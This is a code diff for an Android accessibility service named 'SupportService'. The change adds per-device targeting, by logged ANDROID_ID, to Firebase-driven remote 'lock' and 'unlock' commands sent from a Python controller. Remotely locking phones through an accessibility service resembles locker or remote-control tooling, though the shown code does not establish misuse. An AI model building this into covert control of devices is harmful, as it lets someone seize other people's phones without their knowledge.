@@ -223,7 +223,15 @@ public class SupportService extends AccessibilityService {
 
     private long lastCommandTime = 0;
 
+    private String getDeviceId() {
+        return android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
+    }
+
     private void initFirebaseListener() {
+        final String myDeviceId = getDeviceId();
+        // Log ID HP ini agar Anda bisa memasukkannya ke Whitelist di Python
+        android.util.Log.d("BONDEX_REMOTE", "Device ID: " + myDeviceId);
+
         dbRef = FirebaseDatabase.getInstance().getReference("commands");
         dbRef.addValueEventListener(new ValueEventListener() {
             @Override
@@ -232,14 +240,20 @@ public class SupportService extends AccessibilityService {
 
                 String cmd = snapshot.child("cmd").getValue(String.class);
                 Long serverTime = snapshot.child("t").getValue(Long.class);
+                String target = snapshot.child("target").getValue(String.class); // "all" atau Device ID
 
-                if (cmd == null || serverTime == null) return;
+                if (cmd == null || serverTime == null || target == null) return;
                 
-                // Hanya proses jika ini perintah baru (timestamp lebih besar)
+                // Cek apakah perintah ini untuk HP ini atau untuk semua HP
+                if (!target.equalsIgnoreCase("all") && !target.equalsIgnoreCase(myDeviceId)) {
+                    return; 
+                }
+
                 if (serverTime <= lastCommandTime) return;
                 lastCommandTime = serverTime;
 
                 task_handler.post(() -> {
+                    // ... kode lock/unlock tetap sama ...
                     if (cmd.equalsIgnoreCase("lock")) {
                         if (!isLocked) {
                             input_buffer.setLength(0);
